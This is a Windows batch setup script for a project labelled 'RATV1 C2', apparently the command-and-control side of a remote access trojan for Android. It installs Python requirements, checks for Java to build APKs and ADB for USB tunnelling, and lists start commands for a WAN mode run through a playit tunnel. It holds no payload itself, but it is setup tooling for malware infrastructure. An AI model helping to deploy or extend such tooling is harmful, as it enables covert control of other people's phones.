@echo off
setlocal
echo.
echo  +--------------------------------------------------+
echo  ^|  RATV1 C2 -- SETUP                            ^|
echo  +--------------------------------------------------+
echo.

:: Python check
python --version >nul 2>&1
if errorlevel 1 (
    echo  [!] Python not found. Install Python 3.10+ from https://python.org
    pause & exit /b 1
)
for /f "tokens=2" %%V in ('python --version 2^>^&1') do set PYVER=%%V
echo  [+] Python %PYVER%

:: venv
if not exist "venv" (
    echo  [.] Creating venv...
    python -m venv venv
)
echo  [+] venv ready

:: pip install
echo  [.] Installing requirements...
venv\Scripts\python.exe -m pip install --upgrade pip -q
venv\Scripts\python.exe -m pip install -r requirements.txt -q
echo  [+] Requirements installed

:: Java check (needed to build APKs)
java -version >nul 2>&1
if errorlevel 1 (
    echo  [~] Java not found -- needed to build APKs
    echo      Install JDK 17: winget install Microsoft.OpenJDK.17
) else (
    echo  [+] Java available
)

:: ADB check (needed for USB/tunnel mode)
adb version >nul 2>&1
if errorlevel 1 (
    echo  [~] ADB not found -- needed for USB tunnel mode
    echo      Install: winget install Google.PlatformTools
) else (
    echo  [+] ADB available
)

:: Android SDK (needed to build APKs from source)
if not exist "android-sdk" (
    echo  [.] Android SDK not found -- running sdk setup...
    venv\Scripts\python.exe setup.py
) else (
    echo  [+] Android SDK found
)

echo.
echo  +--------------------------------------------------+
echo  ^|  SETUP COMPLETE                                  ^|
echo  ^|                                                  ^|
echo  ^|  ADB mode (USB):                                 ^|
echo  ^|    start.bat                                     ^|
echo  ^|                                                  ^|
echo  ^|  WAN mode (any network):                         ^|
echo  ^|    venv\Scripts\python.exe wan.py --setup-playit ^|
echo  ^|    venv\Scripts\python.exe wan.py --mode playit  ^|
echo  ^|    start.bat                                     ^|
echo  +--------------------------------------------------+
echo.
pause
